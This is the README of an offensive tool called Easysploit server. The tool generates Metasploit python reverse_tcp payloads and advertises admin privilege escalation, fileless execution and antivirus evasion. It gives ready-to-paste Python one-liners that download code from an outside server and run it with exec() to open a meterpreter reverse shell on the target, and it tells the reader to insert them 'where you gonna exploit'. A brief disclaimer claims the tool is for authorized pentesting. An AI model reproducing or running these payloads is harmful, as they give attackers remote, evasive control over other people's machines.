# Easysploit-server
## Overview
Easysploit Server is a tool designed to generate, customize, and manage Metasploit reverse_tcp payloads. It simplifies exploitation with built-in admin privilege escalation, and AV evasion capabilities, supporting fileless execution for fast, undetectable operations.  
Easysploit server is now working on https://easysploit.rocknroll17.com.  
  
## Features  
- Custom Reverse_TCP Payloads
- Admin Privilege Escalation
- Fileless Execution (Memory-based)
- Anti-Virus Evasion
  
## Installation  
You don't need to run this server.  
It is already working on https://easysploit.rocknroll17.com.  
  
## Usage  
Server receives GET, POST both requests.
GET: Params
POST: Body JSON

### Available Endpoints  
1. **Standard python Reverse TCP Payload**  
Endpoint: `/python/meterpreter/reverse_tcp`  
2. **Admin Privilege Reverse TCP Payload**  
Endpoint: `/python/meterpreter/reverse_tcp/admin`  

### GET Param
```
LHOST: Attacker's IP
LPORT: Attacker's listening port
```
  
### POST Body
Both endpoints require the same JSON payload:  
```
{
  "LHOST": "Attacker's IP",
  "LPORT": Attacker's listening port
}
```  
  
## Example Code
Insert this code where you gonna exploit.  
1. **Standard python Reverse TCP Payload**  
```
import urllib.request, json
exec(urllib.request.urlopen(urllib.request.Request("https://easysploit.rocknroll17.com/python/meterpreter/reverse_tcp", data=json.dumps({"LHOST": "Attacker's IP", "LPORT": Attacker's listening port}).encode(), headers={'Content-Type': 'application/json'})).read().decode())
```  
2. **Admin Privilege Reverse TCP Payload**  
```
import urllib.request, json
exec(urllib.request.urlopen(urllib.request.Request("https://easysploit.rocknroll17.com/python/meterpreter/reverse_tcp/admin", data=json.dumps({"LHOST": "Attacker's IP", "LPORT": Attacker's listening port}).encode(), headers={'Content-Type': 'application/json'})).read().decode())
```

## Terms of Use
This tool is provided for **legal pentesting tests** and should only be used in **authorized environments**.  
Any illegal activity performed using this tool is the **sole responsibility of the user**.  
By using this tool, you agree to these terms and accept full legal responsibility for its use.